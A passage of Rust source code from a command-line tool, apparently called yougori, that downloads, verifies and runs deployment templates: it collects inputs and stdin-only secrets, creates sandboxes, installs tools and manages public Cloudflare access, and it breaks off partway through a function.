//! Running a template (docs/hub.md section 5.1): download, verify, requirements, review,
//! questions, create, tools, public access, then steps and outputs. Each part is remembered as it
//! finishes, so `yougori template continue INSTANCE` carries on from where a run stopped, with the
//! exact files the instance was made from. Ctrl+C always stops, saying what was kept and how to
//! continue or remove it.
use super::{
    client::{self, Cache, Site},
    format::{self, Folder, Kind, Question, Source, Tool},
    instances::{self, Address, Instances, Part, State, Step},
    refs::{self, Ref},
    render,
    review::{self, Host},
    scan::{self, Files},
    tools,
};
use crate::cli_ui as ui;
use serde_json::{json, Value};
use std::{
    collections::{BTreeMap, BTreeSet},
    path::{Path, PathBuf},
    sync::{atomic::AtomicBool, Arc},
};
use zeroize::Zeroizing;

/// What a run was asked to do.
#[derive(Debug, Default)]
pub struct Options {
    pub source: String,
    pub name: Option<String>,
    pub inputs: Vec<(String, String)>,
    pub inputs_file: Option<String>,
    pub secrets_stdin: bool,
    pub yes: bool,
    pub allow_pc_access: bool,
    pub dry_run: bool,
}

/// What a template comes from.
#[derive(Clone, Debug)]
pub enum Wanted {
    Hub(Ref),
    Folder(PathBuf),
}

/// A Hub address, or a template folder on this computer.
pub fn wanted(source: &str) -> Result<Wanted, String> {
    let website = client::website();
    if source.starts_with("hub/") || refs::looks_like_ref(source, &website) || source.contains("yougori.com/hub/") {
        return refs::parse(source, &website).map(Wanted::Hub);
    }
    let path = Path::new(source);
    if path.is_dir() {
        return path.canonicalize().map(|path| Wanted::Folder(client::plain(path))).map_err(|e| format!("Cannot open the folder {source}: {e}"));
    }
    Err(format!("{} is not a Hub address or a template folder. Use hub/PUBLISHER/NAME, or ./FOLDER with a yougori-template.yaml.", scan::shown(source)))
}

/// A template ready for review: its checked files, where it came from and what the Hub says.
pub struct Prepared {
    pub files: Files,
    pub folder: Folder,
    /// The Hub item at the version obtained, or the folder.
    pub origin: Wanted,
    pub version: String,
    pub digest: String,
    pub verified: bool,
    pub detail: Option<Value>,
    /// The review from the files, with the template's Hub tools filled in.
    pub review: Value,
    /// Whether the Hub page's summary says something else than the files.
    pub differs: bool,
    pub notices: Vec<String>,
    /// The template's Hub tools, checked, by `PUBLISHER/NAME`.
    pub hub_tools: BTreeMap<String, Tool>,
    /// The Hub tools that are not Verified, even inside a Verified template.
    pub unverified_tools: Vec<String>,
}

impl Prepared {
    pub fn label(&self) -> String {
        match &self.origin {
            Wanted::Hub(reference) => format!("{} {}", reference.item(), self.version),
            Wanted::Folder(path) => format!("{} {} (from {})", self.folder.template.name(), self.version, path.display()),
        }
    }
    /// How the template is named in a command that runs it again.
    pub fn source(&self) -> String {
        match &self.origin {
            Wanted::Hub(reference) => format!("hub/{}@{}", reference.item(), self.version),
            Wanted::Folder(path) => instances::quote(&path.to_string_lossy()),
        }
    }
}

/// Downloads (or reads), verifies and checks a template and its Hub tools for a new run, and
/// builds its review from the files. The Hub is asked first, so a removed item is refused.
pub async fn prepare(site: &Site, cache: &Cache, wanted: &Wanted) -> Result<Prepared, String> {
    match wanted {
        Wanted::Hub(reference) => {
            let got = client::obtain(site, cache, reference).await?;
            if got.bundle.kind != "template" {
                return Err(format!("{} is a {}, not a template. Add it with yougori tool add hub/{}.", reference.item(), got.bundle.kind, reference.item()));
            }
            let origin = Wanted::Hub(reference.at(&got.bundle.version));
            let notices = got.notice.into_iter().collect();
            examine(site, cache, got.bundle.files, origin, got.bundle.version, got.bundle.digest, got.bundle.verified, got.detail, notices, false).await
        }
        Wanted::Folder(path) => {
            let collected = scan::collect(path)?;
            if !collected.files.contains_key(format::TEMPLATE_FILE) {
                return Err(format!("{} has no {}. Start a template with yougori template new NAME.", path.display(), format::TEMPLATE_FILE));
            }
            let digest = scan::digest_of(&collected.files);
            examine(site, cache, collected.files, wanted.clone(), String::new(), digest, false, None, Vec::new(), false).await
        }
    }
}

/// The exact files an existing instance was made from: its Hub version (the checked copy here
/// first, so an item removed since still works), or its folder, which must not have changed.
pub async fn prepare_own(site: &Site, cache: &Cache, state: &State) -> Result<Prepared, String> {
    match (&state.item, &state.path) {
        (Some(item), _) => {
            let reference = refs::parse(&format!("hub/{item}@{}", state.version), "")?;
            let got = client::own(site, cache, &reference, &state.digest).await?;
            // A copy read from this computer keeps the badge only when the instance had it.
            let verified = got.bundle.verified && (got.detail.is_some() || state.verified);
            let notices = got.notice.into_iter().collect();
            examine(site, cache, got.bundle.files, Wanted::Hub(reference), got.bundle.version, got.bundle.digest, verified, got.detail, notices, true).await
        }
        (None, Some(path)) => {
            let path = PathBuf::from(path);
            let collected = scan::collect(&path).map_err(|error| format!("{error} {} was made from that folder; restore it, or remove the instance with {}.", state.instance, state.remove_command()))?;
            let digest = scan::digest_of(&collected.files);
            if digest != state.digest {
                return Err(format!("The folder {} changed since {} was made, so it cannot be continued as it was. Apply the changes with yougori template update {}.", path.display(), state.instance, state.instance));
            }
            examine(site, cache, collected.files, Wanted::Folder(path), String::new(), digest, false, None, Vec::new(), true).await
        }
        _ => Err(format!("{} does not say where its template came from; remove it with {} and run the template again.", state.instance, state.remove_command())),
    }
}

#[allow(clippy::too_many_arguments)]
async fn examine(site: &Site, cache: &Cache, files: Files, origin: Wanted, version: String, digest: String, verified: bool, detail: Option<Value>, mut notices: Vec<String>, saved_tools: bool) -> Result<Prepared, String> {
    let folder = format::template(&files).map_err(|problems| format!("{}\nNothing was created.", tools::list("This template", &problems)))?;
    let version = if version.is_empty() { folder.template.version().to_owned() } else { version };
    let wallet: Vec<String> = scan::scan(&files).wallet_notice().into_iter().collect();
    let mut hub_tools = BTreeMap::new();
    let mut unverified_tools = Vec::new();
    for use_ in &folder.tools {
        let Source::Hub(reference) = &use_.source else { continue };
        if hub_tools.contains_key(&reference.item()) {
            continue;
        }
        // An existing instance uses the checked copy of its pinned tool; a new run asks the Hub,
        // so a tool removed from it stops the run.
        let saved = if saved_tools { reference.version.as_ref().and_then(|v| cache.load(&reference.publisher, &reference.name, v).ok().flatten()) } else { None };
        let bundle = match saved {
            Some(bundle) => bundle,
            None => {
                let got = client::obtain(site, cache, reference).await.map_err(|error| format!("The template's tool {}: {error}", reference.item()))?;
                notices.extend(got.notice);
                got.bundle
            }
        };
        if bundle.kind != "tool" {
            return Err(format!("The template's tool {} is a {} on the Hub, not a tool. Nothing was created.", reference.item(), bundle.kind));
        }
        let tool = format::tool(&bundle.files, "").map_err(|problems| format!("{}\nNothing was created.", tools::list(&format!("The tool {}", reference.item()), &problems)))?;
        let environment = &folder.project.environments[&use_.environment];
        if tool.key_variable().is_some() && !format::key_ready(environment) {
            return Err(format!("The template's tool {} signs in with an API key, which {} cannot receive (a microVM without an image). Nothing was created.", reference.item(), use_.environment));
        }
        if !bundle.verified {
            unverified_tools.push(reference.item());
        }
        hub_tools.insert(reference.item(), tool);
    }
    let fixed = render::host_ports(&folder.project);
    if !fixed.is_empty() {
        notices.push(format!("This template fixes host ports ({}). They open inside their sandboxes only, so copies never clash; public access works as usual, and yougori ports publish opens one on this computer.", fixed.join(", ")));
    }
    if let Some(original) = detail.as_ref().and_then(|d| d["forkedFrom"].as_object()).filter(|f| f.get("available").and_then(Value::as_bool) == Some(false)) {
        notices.push(format!("This is a fork of {}, which is no longer on the Hub.", super::views::clean(original.get("ref").and_then(Value::as_str).unwrap_or("another item"))));
    }
    let base = review::template(&folder, &wallet, &BTreeMap::new());
    let mut review = review::template(&folder, &wallet, &hub_tools);
    for tool in review["tools"].as_array_mut().into_iter().flatten() {
        if tool["source"] == "hub" {
            let unchecked = tool["name"].as_str().is_some_and(|name| unverified_tools.iter().any(|t| t == name));
            tool["verified"] = json!(!unchecked);
        }
    }
    for name in &unverified_tools {
        if let Some(warnings) = review["warnings"].as_array_mut() {
            warnings.push(json!(format!("The Hub tool {name} is not checked by Yougori: its install lines can contain harmful code. Read its files first.")));
        }
    }
    let differs = detail.as_ref().is_some_and(|detail| detail["version"]["version"] == version.as_str() && review::differs(&base, &detail["version"]["review"]));
    Ok(Prepared { files, folder, origin, version, digest, verified, detail, review, differs, notices, hub_tools, unverified_tools })
}

/// What Ctrl+C left behind and how to continue or remove it; `nothing` when this command had not
/// made anything yet.
pub fn stopped_or(nothing: &str) -> String {
    stopped_with(instances::current().as_ref(), nothing)
}

/// [`stopped_or`] for the instance a command had saved by then, if any.
pub fn stopped_with(current: Option<&State>, nothing: &str) -> String {
    match current {
        None => nothing.to_owned(),
        // Everything had finished; only the last courtesy (telling the Hub) was skipped.
        Some(state) if state.status_word() == "ready" => format!("Stopped. {} is ready; nothing was left unfinished. Status: yougori template status {}", state.instance, state.instance),
        Some(state) => {
            let kept = match state.environments.len() {
                0 => "The instance folder was kept".to_owned(),
                1 => "The instance folder and its sandbox were kept".to_owned(),
                n => format!("The instance folder and its {n} sandboxes were kept"),
            };
            format!("Stopped. {kept}. Continue: {} · Remove: {}", state.continue_command(), state.remove_command())
        }
    }
}

/// [`stopped_or`] for a run, which creates nothing before it says so.
pub fn stopped() -> String {
    stopped_or("Cancelled. Nothing was created.")
}

pub(super) fn save(instances: &Instances, state: &mut State) -> Result<(), String> {
    instances.save(state)
}

/// Waits with a spinner at a terminal; plainly otherwise.
pub(super) async fn wait<T>(interactive: bool, label: &str, work: impl std::future::Future<Output = Result<T, String>>) -> Result<T, String> {
    if interactive { ui::busy(label, work).await } else { work.await }
}

/// Keeps the engine's progress notes off an interactive screen for as long as it lives.
pub(super) struct Quiet(bool);
impl Quiet {
    pub(super) fn on() -> Quiet {
        Quiet(crate::client::QUIET.swap(true, std::sync::atomic::Ordering::Relaxed))
    }
}
impl Drop for Quiet {
    fn drop(&mut self) {
        crate::client::QUIET.store(self.0, std::sync::atomic::Ordering::Relaxed);
    }
}

/// This computer's facts for the requirement checks, and the engine's state.
pub(super) async fn host(folder: &Folder, hub_tools: &BTreeMap<String, Tool>) -> Result<(Host, Value), String> {
    crate::client::start(None).await?;
    let state = crate::public::call("get_platform_state", json!({})).await?;
    let mut host = Host::here();
    host.memory_gb = state["host"]["totalMemoryGb"].as_f64();
    host.free_disk_gb = state["host"]["totalStorageGb"].as_f64().zip(state["host"]["usedStorageGb"].as_f64()).map(|(total, used)| (total - used).max(0.0));
    let bundled_gpu = folder.tools.iter().any(|t| matches!(&t.source, Source::Bundled { tool, .. } if tool.gpu() != "none"));
    if folder.gpu() != "none" || bundled_gpu || hub_tools.values().any(|t| t.gpu() != "none") {
        host.gpu = crate::public::call("get_cuda_runtime_status", json!({})).await.ok().and_then(|status| status["supported"].as_bool());
    }
    Ok((host, state))
}

/// The secret ID that holds a tool's API key, short enough for every instance name.
pub fn key_id(tool: &str) -> String {
    let plain = format!("key-{tool}");
    if plain.len() <= 35 {
        return plain;
    }
    let hash = scan::sha256_hex(tool.as_bytes());
    format!("key-{}-{}", &tool[..22.min(tool.len())].trim_end_matches(['-', '_']), &hash[..8])
}

/// The questions a run asks: the template's inputs, then an API key for each tool that signs in
/// with one (`tool.NAME`; optional, so the tool can ask itself instead).
pub fn questions(prepared: &Prepared) -> Vec<Question> {
    let mut all = prepared.folder.questions.clone();
    let mut seen = BTreeSet::new();
    for use_ in &prepared.folder.tools {
        let Some(tool) = tool_of(prepared, use_) else { continue };
        let Some(variable) = tool.key_variable() else { continue };
        if !seen.insert(tool.name().to_owned()) {
            continue;
        }
        all.push(Question {
            id: format!("tool.{}", tool.name()),
            question: format!("API key for {} ({variable})", tool.title()),
            kind: Kind::Secret,
            required: false,
            default: None,
            when: None,
            hint: format!("Stored as a deployment secret and given to {} as {variable}. Leave it empty to sign in later.", tool.name()),
            choices: Vec::new(),
            pattern: None,
            min: None,
            max: None,
        });
    }
    all
}

/// The tool file of a template's tool, for bundled and Hub tools.
fn tool_of<'a>(prepared: &'a Prepared, use_: &'a format::ToolUse) -> Option<&'a Tool> {
    match &use_.source {
        Source::Bundled { tool, .. } => Some(tool.as_ref()),
        Source::Hub(reference) => prepared.hub_tools.get(&reference.item()),
        Source::BuiltIn(_) => None,
    }
}

/// Answers a script gave: `--inputs FILE`, `--input ID=VALUE` and `--secrets -` on stdin.
pub struct Given {
    pub inputs: BTreeMap<String, String>,
    pub secrets: BTreeMap<String, Zeroizing<String>>,
}

fn read_limited(source: &mut dyn std::io::Read, what: &str) -> Result<Zeroizing<Vec<u8>>, String> {
    use std::io::Read;
    let mut bytes = Zeroizing::new(Vec::new());
    Read::take(&mut *source, crate::wire::MAX_REQUEST as u64 + 1).read_to_end(&mut bytes).map_err(|e| format!("Cannot read {what}: {e}"))?;
    if bytes.len() > crate::wire::MAX_REQUEST {
        return Err(format!("{what} is larger than 1 MiB."));
    }
    Ok(bytes)
}

/// Reads stdin away from the command's own thread, so Ctrl+C still stops a read that waits on a
/// terminal.
pub async fn read_stdin(what: &'static str) -> Result<Zeroizing<Vec<u8>>, String> {
    tokio::task::spawn_blocking(move || read_limited(&mut std::io::stdin(), what))
        .await
        .map_err(|_| format!("Cannot read {what}."))?
}

/// Reads what a script supplied, refusing secrets anywhere but stdin. `secrets` holds what
/// `--secrets -` read from stdin.
pub fn given(options: &Options, questions: &[Question], secrets: Option<&[u8]>) -> Result<Given, String> {
    let secret = |id: &str| questions.iter().any(|q| q.id == id && q.kind == Kind::Secret);
    let known = |id: &str| questions.iter().any(|q| q.id == id);
    let ids = || questions.iter().filter(|q| q.kind != Kind::Secret).map(|q| q.id.as_str()).collect::<Vec<_>>().join(", ");
    let mut inputs = BTreeMap::new();
    if let Some(path) = &options.inputs_file {
        let mut file = std::fs::File::open(path).map_err(|e| format!("Cannot open the --inputs file {path}: {e}"))?;
        let bytes = read_limited(&mut file, "the --inputs file")?;
        let value: Value = serde_json::from_slice(bytes.strip_prefix(&[0xef, 0xbb, 0xbf]).unwrap_or(&bytes)).map_err(|e| format!("The --inputs file is not a JSON object ({e})."))?;
        let object = value.as_object().ok_or("The --inputs file must be a JSON object such as {\"access\": \"quick\"}.")?;
        for (id, value) in object {
            if secret(id) {
                return Err(format!("{id} is a secret: never put it in an --inputs file. Pass it with --secrets - and {{\"{id}\": \"…\"}} on stdin."));
            }
            if !known(id) {
                return Err(format!("This template has no input {}. Its inputs: {}.", scan::shown(id), ids()));
            }
            let text = match value {
                Value::String(text) => text.clone(),
                Value::Number(number) => number.to_string(),
                Value::Bool(yes) => if *yes { "yes" } else { "no" }.to_owned(),
                _ => return Err(format!("The --inputs value for {id} must be text, a number or true/false.")),
            };
            inputs.insert(id.clone(), text);
        }
    }
    for (id, value) in &options.inputs {
        if secret(id) {
            return Err(format!("{id} is a secret: never put it on the command line. Pass it with --secrets - and {{\"{id}\": \"…\"}} on stdin."));
        }
        if !known(id) {
            return Err(format!("This template has no input {}. Its inputs: {}.", scan::shown(id), ids()));
        }
        inputs.insert(id.clone(), value.clone());
    }
    let mut stored = BTreeMap::new();
    if let Some(bytes) = secrets {
        // Each value moves straight into memory that is wiped when it is dropped.
        let object: BTreeMap<String, Value> = serde_json::from_slice(bytes.strip_prefix(&[0xef, 0xbb, 0xbf]).unwrap_or(bytes)).map_err(|_| "--secrets - reads a JSON object on stdin, such as {\"openai_key\": \"…\"}.")?;
        for (id, value) in object {
            if !secret(&id) {
                return Err(if known(&id) {
                    format!("{id} is not a secret: pass it with --input {id}=VALUE.")
                } else {
                    format!("This template asks for no secret {}.", scan::shown(&id))
                });
            }
            let Value::String(text) = value else { return Err(format!("The secret {id} must be text.")) };
            stored.insert(id, Zeroizing::new(text));
        }
    }
    Ok(Given { inputs, secrets: stored })
}

/// Answers by question ID, and secret answers by question ID.
pub type Answers = (BTreeMap<String, String>, BTreeMap<String, Zeroizing<String>>);

/// Every answer for a script, from what it gave and the defaults; missing ones are named with the
/// flag that supplies them.
pub fn script_answers(questions: &[Question], given: &Given, already: &BTreeMap<String, String>, stored: &BTreeSet<String>, domains: Option<&[String]>) -> Result<Answers, String> {
    let mut answers = BTreeMap::new();
    let mut secrets = BTreeMap::new();
    let mut missing = Vec::new();
    for question in questions {
        if !question.asked(&answers) {
            continue;
        }
        if question.kind == Kind::Secret {
            match given.secrets.get(&question.id) {
                Some(value) if !value.is_empty() => {
                    let checked = question.answer(value, None).map_err(|error| format!("The secret {}: {error}", question.id))?;
                    secrets.insert(question.id.clone(), Zeroizing::new(checked));
                }
                _ if stored.contains(&question.id) || !question.required => {}
                _ => missing.push(format!("{} (--secrets - with {{\"{}\": \"…\"}} on stdin)", question.id, question.id)),
            }
            continue;
        }
        let value = given.inputs.get(&question.id).or_else(|| already.get(&question.id)).cloned().or_else(|| question.default.clone());
        match value {
            Some(value) => {
                let checked = question.answer(&value, domains.filter(|_| question.kind == Kind::Domain)).map_err(|error| format!("--input {}: {error}", question.id))?;
                answers.insert(question.id.clone(), checked);
            }
            None if !question.required => {}
            None => missing.push(format!("{} (--input {}=VALUE)", question.id, question.id)),
        }
    }
    if !missing.is_empty() {
        return Err(format!("This template needs answers to: {}. Nothing was created.", missing.join(", ")));
    }
    Ok((answers, secrets))
}

/// One question at the terminal, with Back. `None` when an optional question was left empty.
pub(super) fn ask_question(question: &Question, previous: Option<&String>, domains: &[String]) -> Result<Option<String>, String> {
    let note: Vec<String> = if question.hint.is_empty() { Vec::new() } else { vec![question.hint.clone()] };
    match question.kind {
        Kind::Choice => {
            let choices: Vec<ui::Choice> = question.choices.iter().map(|c| ui::Choice::new(c.label.clone(), c.hint.clone())).collect();
            let wanted = previous.or(question.default.as_ref());
            let initial = wanted.and_then(|w| question.choices.iter().position(|c| &c.value == w)).unwrap_or(0);
            let index = ui::select(&question.question, &note, &choices, initial)?;
            Ok(Some(question.choices[index].value.clone()))
        }
        Kind::YesNo => {
            let initial = usize::from(previous.or(question.default.as_ref()).is_some_and(|a| a == "no"));
            let index = ui::select(&question.question, &note, &[ui::Choice::new("Yes", ""), ui::Choice::new("No", "")], initial)?;
            Ok(Some(if index == 0 { "yes" } else { "no" }.into()))
        }
        Kind::Domain => {
            if domains.is_empty() {
                let note = vec![
                    "No domains are saved on this computer yet.".to_owned(),
                    "Save one with yougori domain add HOST --tunnel-port PORT --file - --yes, then run this again,".to_owned(),
                    "or go back and choose a quick link.".to_owned(),
                ];
                ui::select(&question.question, &note, &[ui::Choice::new("Cancel", "nothing was created")], 0)?;
                return Err(crate::wire::cancelled("Cancelled. Nothing was created. Save a domain with yougori domain add, then run the template again."));
            }
            let choices: Vec<ui::Choice> = domains.iter().map(|d| ui::Choice::new(d.clone(), "saved domain")).collect();
            let initial = previous.and_then(|p| domains.iter().position(|d| d == p)).unwrap_or(0);
            let index = ui::select(&question.question, &note, &choices, initial)?;
            Ok(Some(domains[index].clone()))
        }
        Kind::Text | Kind::Number | Kind::Secret => {
            let secret = question.kind == Kind::Secret;
            let default = if secret { String::new() } else { previous.cloned().or_else(|| question.default.clone()).unwrap_or_default() };
            let optional = !question.required;
            let check = |entry: &str| -> Result<String, String> {
                if entry.trim().is_empty() && optional {
                    return Ok(String::new());
                }
                question.answer(entry, None)
            };
            let label = if optional { format!("{} (optional)", question.question) } else { question.question.clone() };
            let answer = if note.is_empty() {
                ui::input(&label, &default, secret, &check)?
            } else if secret {
                ui::input(&format!("{label} · {}", note[0]), "", true, &check)?
            } else {
                ui::input_noted(&label, &note, &default, &check)?
            };
            Ok((!answer.is_empty()).then_some(answer))
        }
    }
}

/// The saved domains' names, for domain questions and their checks.
pub(super) async fn saved_domains() -> Vec<String> {
    let value = crate::public::call("list_saved_domains", json!({})).await.unwrap_or(Value::Null);
    let list = value.as_array().or_else(|| value["domains"].as_array()).cloned().unwrap_or_default();
    list.iter().filter_map(|d| d["hostname"].as_str().map(str::to_ascii_lowercase)).collect()
}

/// The values placeholders take for this instance.
pub(super) fn values(state: &State, public: &BTreeMap<String, String>) -> render::Values {
    render::Values {
        instance: state.instance.clone(),
        inputs: state.answers.clone(),
        secrets: state.secrets.iter().filter(|id| !id.starts_with("tool.")).map(|id| (id.clone(), render::secret_name(&state.instance, id))).collect(),
        public: public.clone(),
        names: state.names.clone(),
    }
}

/// A sandbox's real name: what the engine called it, or `INSTANCE-NAME` before it exists.
pub(super) fn sandbox_name(state: &State, key: &str) -> String {
    state.names.get(key).cloned().unwrap_or_else(|| format!("{}-{key}", state.instance))
}

/// Secret bindings a run adds for tools' API keys.
pub(super) fn adjust(state: &State, prepared: &Prepared) -> render::Adjust {
    let mut secrets: BTreeMap<String, BTreeMap<String, String>> = BTreeMap::new();
    for use_ in &prepared.folder.tools {
        let Some(tool) = tool_of(prepared, use_) else { continue };
        if let Some(variable) = tool.key_variable() {
            if state.secrets.contains(&format!("tool.{}", tool.name())) {
                secrets.entry(use_.environment.clone()).or_default().insert(variable.to_owned(), render::secret_name(&state.instance, &key_id(tool.name())));
            }
        }
    }
    render::Adjust { without_gpu: state.without_gpu, secrets }
}

/// The deployment secret's name for an answer: inputs keep their ID; tool keys get [`key_id`].
pub(super) fn stored_name(instance: &str, id: &str) -> String {
    match id.strip_prefix("tool.") {
        Some(tool) => render::secret_name(instance, &key_id(tool)),
        None => render::secret_name(instance, id),
    }
}

/// The engine's sentence for a clash, in the words of this command. Job failures arrive as
/// `project_action: SENTENCE (job ID)`.
pub(super) fn friendly(error: String, instance: &str) -> String {
    if error.contains("Another project folder already uses this project name") {
        return format!("Another Yougori project is already called {instance}. Choose another instance name with --name; nothing else was changed.");
    }
    if let Some(at) = error.find(" already exists outside this project") {
        let name = error[..at].rsplit(": ").next().unwrap_or(&error[..at]).trim();
        return format!("An environment named {name} already exists and is not part of {instance}. Choose another instance name with --name; nothing else was changed.");
    }
    error
}

/// Sandboxes deleted elsewhere since the last run: forgotten here, so the next reconciliation
/// makes them again with their tools and public access. Returns their names in the template.
pub(super) fn check_live(state: &mut State, live: &Value) -> Vec<String> {
    let exists = |id: &str| live["environments"].as_array().into_iter().flatten().any(|e| e["id"] == id);
    let gone: Vec<String> = state.environments.iter().filter(|(_, id)| !exists(id)).map(|(key, _)| key.clone()).collect();
    for key in &gone {
        state.environments.remove(key);
        state.names.remove(key);
        instances::reset_environment(state, key);
        state.create = Part::pending();
    }
    gone
}

/// Creates (or brings up to date) the instance's sandboxes with the same reconciliation as
/// `yougori up`, and records what the engine made: each sandbox's ID and real name. A sandbox
/// that was replaced or made again has its tools and public access set up again.
pub(super) async fn up(state: &mut State, instances: &Instances, interactive: bool) -> Result<(), String> {
    let path = instances.folder(&state.instance).join(&state.project);
    if let Some(key) = instances::project_key(&path) {
        state.project_keys.insert(key);
    }
    let declared: Vec<String> = state.review["environments"].as_array().into_iter().flatten().filter_map(|e| e["name"].as_str().map(str::to_owned)).collect();
    state.keys.extend(declared.iter().cloned());
    let params = json!({"path": path, "action": "up"});
    let count = declared.len();
    let label = format!("Creating {count} {}", if count == 1 { "sandbox" } else { "sandboxes" });
    let result = if interactive {
        let cancel = Arc::new(AtomicBool::new(false));
        let _keys = ui::Interrupts::watch(cancel.clone());
        let mut task = ui::loading_task(&label);
        let result = crate::public::call_with_progress_cancellable("project_action", params, |measurement| match measurement["phase"].as_str() {
            Some("starting") => task.set("Starting the sandboxes"),
            Some("publishing") => task.set("Connecting the sandboxes"),
            Some("readiness") => task.set("Checking that the sandboxes are ready"),
            _ => {}
        }, &cancel).await;
        match &result {
            Ok(_) => task.done(&format!("{} ready", if count == 1 { "Sandbox" } else { "Sandboxes" })),
            Err(error) if crate::wire::cancellation(error).is_some() => task.clear(),
            Err(_) => task.fail("The sandboxes were not all created"),
        }
        result
    } else {
        crate::public::call("project_action", params).await
    };
    let live = crate::public::call("get_platform_state", json!({})).await.ok();
    match result {
        Ok(value) => {
            let made: BTreeMap<String, String> = value["environments"].as_object().into_iter().flatten().filter_map(|(key, id)| id.as_str().map(|id| (key.clone(), id.to_owned()))).collect();
            record(state, &made, live.as_ref());
            state.create = Part::done();
            state.steps.retain(|s| !s.title.starts_with("Check the sandboxes"));
            if value["ready"] == false {
                state.steps.push(Step { title: "Check the sandboxes that are not ready yet".into(), detail: Some("They were created; an app inside may still be starting.".into()), command: Some(format!("yougori deployment status -f {}", instances::quote(&path.to_string_lossy()))) });
            }
            save(instances, state)
        }
        Err(error) => {
            // Whatever the engine made before it stopped is kept and remembered.
            if let Some(live) = &live {
                let found: BTreeMap<String, String> = instances::sandboxes(state, live).into_iter()
                    .filter(|sandbox| !sandbox.replaced && declared.contains(&sandbox.key))
                    .map(|sandbox| (sandbox.key, sandbox.id))
                    .collect();
                record(state, &found, Some(live));
            }
            let cancelled = crate::wire::cancellation(&error).is_some();
            let said = if cancelled { error.clone() } else { friendly(error, &state.instance) };
            state.create = Part::failed(if cancelled { "Stopped with Ctrl+C before the sandboxes were all created.".to_owned() } else { said.clone() });
            save(instances, state)?;
            Err(said)
        }
    }
}

/// Remembers the sandboxes the engine has for each environment, resetting the parts of any that
/// changed.
fn record(state: &mut State, made: &BTreeMap<String, String>, live: Option<&Value>) {
    for (key, id) in made {
        if state.environments.get(key).is_some_and(|old| old != id) {
            instances::reset_environment(state, key);
        }
        state.environments.insert(key.clone(), id.clone());
        if let Some(name) = live.and_then(|live| live["environments"].as_array().into_iter().flatten().find(|e| e["id"] == id.as_str()).and_then(|e| e["name"].as_str())) {
            state.names.insert(key.clone(), name.to_owned());
        }
    }
}

/// Installs the template's tools that are not installed yet. A tool that fails is recorded and
/// the others go on; continuing retries only the ones that did not finish.
pub(super) async fn install_tools(state: &mut State, instances: &Instances, prepared: &Prepared, interactive: bool) -> Result<(), String> {
    for use_ in &prepared.folder.tools {
        let key = format!("{}/{}", use_.environment, use_.name());
        if state.tools.get(&key).is_some_and(|part| part.is("done")) {
            continue;
        }
        let sandbox = sandbox_name(state, &use_.environment);
        let Some(id) = state.environments.get(&use_.environment).cloned() else {
            state.tools.insert(key, Part::failed(format!("{sandbox} was not created.")));
            continue;
        };
        let part = match (&use_.source, tool_of(prepared, use_)) {
            (Source::BuiltIn(name), _) if interactive => match crate::terminal::setup_tool(&id, name).await {
                Ok(crate::terminal::SessionExit::Completed) => Part::done(),
                Ok(_) => Part::step(format!("yougori {name} --environment {}", shell_words::quote(&sandbox))),
                Err(error) => Part::failed(error),
            },
            (Source::BuiltIn(name), _) => Part::step(format!("yougori {name} --environment {}", shell_words::quote(&sandbox))),
            (_, Some(tool)) => custom(&id, &sandbox, tool, state, interactive).await?,
            (Source::Hub(reference), None) => Part::failed(format!("{} could not be downloaded.", reference.item())),
            (Source::Bundled { .. }, None) => Part::failed("The tool's file could not be read.".to_owned()),
        };
        state.tools.insert(key, part);
        save(instances, state)?;
    }
    Ok(())
}

async fn custom(id: &str, sandbox: &str, tool: &Tool, state: &State, interactive: bool) -> Result<Part, String> {
    let retry = state.continue_command();
    let cancel = Arc::new(AtomicBool::new(false));
    let result = if interactive {
        let _keys = ui::Interrupts::watch(cancel.clone());
        let mut task = ui::loading_task(&format!("Installing {} in {sandbox}", tool.name()));
        let result = tools::install(id, sandbox, tool, &retry, &cancel, |label| task.set(label)).await;
        match &result {
            Ok(()) => task.done(&format!("{} ready in {sandbox}", tool.name())),
            Err(error) if error == ui::CANCELLED => task.clear(),
            Err(_) => task.fail(&format!("{} did not install", tool.name())),
        }
        result
    } else {
        tools::install(id, sandbox, tool, &retry, &cancel, |_| {}).await
    };
    match result {
        Ok(()) => Ok(Part::done()),
        Err(error) if error == ui::CANCELLED => Err(error),
        Err(error) => Ok(Part::failed(error)),
    }
}

/// The address of a Cloudflare publication that already serves this port the way it should: a
/// quick link for quick access, or `https://DOMAIN` for a saved domain. A loopback publication
/// (the engine makes one for a fixed host port) never counts.
pub fn serving(services: &Value, port: u16, access: &str, domain: Option<&str>) -> Option<String> {
    services["publications"].as_array().into_iter().flatten()
        .filter(|p| p["port"] == port && p["kind"] == "cloudflare" && matches!(p["status"].as_str(), Some("active" | "running")))
        .find_map(|p| {
            let urls: Vec<&str> = p["urls"].as_array().into_iter().flatten().filter_map(Value::as_str).collect();
            match (access, domain) {
                ("domain", Some(domain)) => urls.iter().find(|url| url.trim_end_matches('/').eq_ignore_ascii_case(&format!("https://{domain}"))).map(|url| url.to_string()),
                ("domain", None) => None,
                ("quick", _) => urls.iter().find(|url| quick_url(url) && p["cloudflareAccount"] != true).map(|url| url.to_string()),
                _ => None,
            }
        })
}

fn quick_url(value: &str) -> bool {
    reqwest::Url::parse(value).is_ok_and(|url| {
        url.scheme() == "https" && url.username().is_empty() && url.password().is_none()
            && url.port().is_none() && url.path() == "/" && url.query().is_none() && url.fragment().is_none()
            && url.host_str().is_some_and(|host| host.ends_with(".trycloudflare.com"))
    })
}

fn public_addresses(state: &State, prepared: &Prepared) -> Result<Vec<Address>, String> {
    let values = values(state, &BTreeMap::new());
    prepared.folder.template.public.iter().map(|entry| {
        let access = render::render(entry.access.as_deref().unwrap_or("quick"), &values)?;
        let domain = if access == "domain" {
            entry.domain.as_deref().map(|d| render::render(d, &values)).transpose()?.map(|d| d.trim().to_ascii_lowercase()).filter(|d| !d.is_empty())
        } else { None };
        Ok(Address { environment: entry.environment.clone().unwrap_or_default(), port: entry.port.unwrap_or_default(), access, domain, url: None, part: Part::pending() })
    }).collect()
}

/// Retire changed or removed internet routes before applying the new project. Keep each old
/// address in the record until unpublishing succeeds, so an interrupted update can retry it.
/// A template owns only Cloudflare routes on its recorded environment/port, never other ports
/// or the local bridges that the project and other services may still need.
async fn reconcile_public<F, Fut>(state: &mut State, instances: &Instances, desired: &[Address], interactive: bool, mut call: F) -> Result<(), String>
where
    F: FnMut(&'static str, Value) -> Fut,
    Fut: std::future::Future<Output = Result<Value, String>>,
{
    let mut index = 0;
    while index < state.public.len() {
        let old = &state.public[index];
        if desired.iter().any(|new| new.environment == old.environment && new.port == old.port && new.access == old.access && (new.access != "domain" || new.domain == old.domain)) {
            index += 1;
            continue;
        }
        let close = async {
            if matches!(old.access.as_str(), "quick" | "domain") {
